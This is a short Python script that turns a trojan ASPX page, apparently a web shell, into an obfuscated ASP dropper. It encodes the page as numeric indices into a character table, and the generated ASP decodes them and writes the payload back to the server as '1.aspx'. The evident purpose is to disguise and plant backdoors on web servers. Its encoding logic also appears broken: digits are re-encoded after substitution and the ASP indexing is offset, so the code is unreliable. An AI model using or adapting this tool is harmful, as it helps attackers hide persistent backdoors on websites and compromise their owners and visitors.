import os

cryp = "0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM`~!@#$%^&*()_+-=[]\\{}|;':\",./<>? \r\n\t"
asp = open(r"muma1/index.aspx")

muma = asp.read()
# muma = "\r\n\t asdf"
print(muma)

asp.close()

plain = ""

l = len(cryp)
i = 0

while i < l:
    muma = muma.replace(cryp[i], str(i) + "\000")
    i += 1
muma = (muma.replace("\000", "|"))[0 : (len(muma)) - 1]
'''***********************************************************'''
print(muma)

def funAsp(muma, filename="muma2/1.aspx"):
    aspCreate = '''<%
dim code,pass,temp1,temp2
pass = \"''' + muma + '''\"
muma = split(pass, \"|\")
code = \"0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM`~!@#$%^&*()_+-=[]\\{}|;':\"\",./<>? \" + chr(10) + chr(13) + chr(9)
for i = 0 to ubound(muma)
temp1 = Cint(muma(i))
temp2 = temp2 & mid(code,temp1,1)
next
Set fso=Server.CreateObject(\"Scripting.FileSystemObject\")
Set f=fso.CreateTextFile(Server.MapPath(\"1.aspx\"),true)
f.WriteLine temp2
f.close
set f=Nothing
set fso=Nothing
%>
'''
    print(filename)
    f = open(filename, "w")
    f.write(aspCreate)

funAsp(muma)




